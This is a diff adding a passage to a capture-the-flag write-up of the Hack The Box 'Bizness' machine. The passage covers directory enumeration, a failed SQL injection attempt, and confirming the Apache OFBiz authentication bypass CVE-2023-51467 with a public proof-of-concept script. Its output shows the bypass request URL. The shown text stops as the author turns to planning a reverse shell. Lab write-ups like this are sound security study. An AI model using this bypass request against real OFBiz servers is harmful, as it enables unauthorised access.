@@ -52,3 +52,33 @@ So I go to my `/etc/hosts` and add an entry for the target.
 
 10.10.11.252 bizness.htb
 ```
+Looks like another server with nginx. I might be able to use the same vulnerability as `Broker` to get the root flag.
+
+### Dirbuster
+Since I'm not sure what is available on this server. I ran `dirbuster`.
+
+From the results I was able to find some directories such as `/accounting` that redirects me to here: `https://bizness.htb/accounting/control/main`
+
+### SQL Injection?
+I tried to use sqlmap against the form with no success. Trying some manual payloads also proved to be unsuccessful.
+
+### [CVE-2023-51467](https://nvd.nist.gov/vuln/detail/CVE-2023-51467)
+After doing some googling, I realized this box has a potential vulnerability with OFBiz.
+
+I was able to confirm using this PoC: https://github.com/K3ysTr0K3R/CVE-2023-51467-EXPLOIT (thank you K3ysTr0K3R).
+
+```
+python CVE-2023-51467.py -u https://bizness.htb
+  _______      ________    ___   ___ ___  ____        _____ __ _  _     ________
+ / ____\ \    / /  ____|  |__ \ / _ \__ \|___ \      | ____/_ | || |   / /____  |
+| |     \ \  / /| |__ ______ ) | | | | ) | __) |_____| |__  | | || |_ / /_   / /
+| |      \ \/ / |  __|______/ /| | | |/ / |__ <______|___ \ | |__   _|  _ \ / /
+| |____   \  /  | |____    / /_| |_| / /_ ___) |      ___) || |  | | | (_) / /
+ \_____|   \/   |______|  |____|\___/____|____/      |____/ |_|  |_|  \___/_/
+
+Coded By: K3ysTr0K3R
+
+[+] https://bizness.htb/webtools/control/ping?USERNAME&PASSWORD=test&requirePasswordChange=Y - is vulnerable to
+CVE-2023-51467
+```
+So now that I have a major vulnerability, I need to set it up to execute a reverse shell.
